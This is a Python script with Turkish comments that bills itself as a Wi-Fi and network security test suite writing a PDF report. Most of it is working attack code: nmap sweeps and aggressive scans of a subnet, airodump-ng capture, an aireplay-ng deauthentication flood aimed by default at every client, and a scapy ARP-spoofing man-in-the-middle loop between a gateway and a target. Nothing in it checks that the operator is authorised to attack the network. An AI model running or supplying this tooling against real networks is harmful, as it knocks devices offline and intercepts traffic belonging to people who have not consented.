import os
import subprocess
import time
import sys
from scapy.all import ARP, send
from datetime import datetime
from reportlab.lib.pagesizes import A4
from reportlab.pdfgen import canvas

INTERFACE = "wlan0"
TARGET_IP_RANGE = "192.168.1.0/24"#############################<--------------kendi ıpni yaz 
WORDLIST = "buraya dosya yolunu yaz"########################################<------------------------------GÜNCELLEEEEEEEEEEE
DEAUTH_COUNT = 10
ARP_INTERVAL = 2
REPORT_FILE = f"security_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf"

if os.geteuid() != 0:
    print("[❌] Lütfen scripti root yetkisiyle çalıştırın!")
    sys.exit(1)

def write_report(title, content):
    print(f"[📝] {title} raporlanıyor...")
    if not hasattr(write_report, "c"):
        write_report.c = canvas.Canvas(REPORT_FILE, pagesize=A4)
        write_report.y = 800
    c = write_report.c
    y = write_report.y
    c.setFont("Helvetica", 12)
    c.drawString(50, y, f"{title}:")
    y -= 20
    for line in content.splitlines():
        c.drawString(60, y, line)
        y -= 15
        if y < 50:
            c.showPage()
            y = 800
    write_report.y = y
    c.showPage()
    c.save()

def network_scan():
    print("\n[🔍] Ağdaki cihazlar taranıyor...")
    try:
        os.system(f"nmap -sn {TARGET_IP_RANGE} -oN scan_result.txt")
        os.system(f"nmap -sV -T4 -A -v {TARGET_IP_RANGE} -oN full_scan.txt")
        write_report("Network Scan", "Ağ taraması tamamlandı. Detaylar scan_result.txt ve full_scan.txt dosyalarında.")
    except Exception as e:
        write_report("Network Scan Hata", str(e))

def wifi_security_test(duration=20):
    print("\n[📡] Wi-Fi ağları taranıyor...")
    try:
        subprocess.run(["airodump-ng", "--write", "wifi_scan", INTERFACE], check=True, timeout=duration)
        write_report("Wi-Fi Scan", f"Wi-Fi taraması tamamlandı. Sonuç wifi_scan-01.csv içinde ({duration}s süreyle tarandı).")
    except subprocess.TimeoutExpired:
        write_report("Wi-Fi Scan", f"Wi-Fi taraması {duration}s sonra durduruldu.")
    except subprocess.CalledProcessError:
        write_report("Wi-Fi Scan Hata", "airodump-ng kurulu değil veya yetki yok.")

def deauth_test(bssid, client_mac="", count=DEAUTH_COUNT):
    print(f"[⚡] Deauthentication paketleri gönderiliyor ({count} paket)...")
    try:
        subprocess.run([
            "aireplay-ng",
            "--deauth", str(count),
            "-a", bssid,
            "-c", client_mac if client_mac else "FF:FF:FF:FF:FF:FF",
            INTERFACE
        ], check=True)
        write_report("DeAuth Test", f"DeAuth testi tamamlandı. Hedef: {bssid}, İstemci: {client_mac or 'Tüm cihazlar'}")
    except subprocess.CalledProcessError as e:
        write_report("DeAuth Hata", str(e))

def mitm_attack(gateway_ip, target_ip, interval=ARP_INTERVAL, duration=10):
    print(f"[🎭] ARP Spoofing başlatılıyor: {target_ip} <- {gateway_ip}")
    start_time = time.time()
    packets_sent = 0
    try:
        while time.time() - start_time < duration:
            send(ARP(pdst=target_ip, psrc=gateway_ip, op='is-at'), verbose=False)
            send(ARP(pdst=gateway_ip, psrc=target_ip, op='is-at'), verbose=False)
            packets_sent += 2
            time.sleep(interval)
        write_report("MITM Test", f"ARP Spoofing tamamlandı. Gönderilen paket sayısı: {packets_sent}")
    except Exception as e:
        write_report("MITM Hata", str(e))

def run_all_tests():
    network_scan()
    wifi_security_test()
    bssid = input("\n[?] DeAuth testi için BSSID girin (MAC adresi): ")
    client = input("[?] Belirli istemci MAC (boş bırak tüm cihazlar): ")
    deauth_test(bssid, client)
    gateway = input("[?] Router IP (Gateway): ")
    target = input("[?] MITM için hedef IP: ")
    print("[ℹ️] MITM testi başlatılıyor. Süresi 10s (CTRL+C ile durdurabilirsiniz).")
    mitm_attack(gateway, target)
    print(f"\n[✅] Tüm testler tamamlandı! PDF rapor dosyası: {REPORT_FILE}")
if __name__ == "__main__":
    print("""
########################################
I<3python
########################################
""")
    run_all_tests()
